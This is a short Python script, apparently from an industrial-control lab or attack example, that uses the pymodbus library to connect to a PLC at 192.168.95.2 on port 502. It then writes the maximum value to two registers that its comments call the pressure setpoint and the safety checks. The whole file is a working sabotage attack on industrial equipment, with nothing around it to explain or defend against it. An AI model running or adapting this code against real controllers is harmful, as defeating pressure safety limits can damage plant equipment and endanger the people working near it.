from pymodbus.client.sync import ModbusTcpClient

# Create a Modbus client
client = ModbusTcpClient('192.168.95.2',port=502)

# Connect to the client
client.connect()

# Overwrite the pressure setpoint and safety checks on the PLC
response = client.write_register(1026, 65535)
response = client.write_register(1025, 65535)

# Close the client connection
client.close()
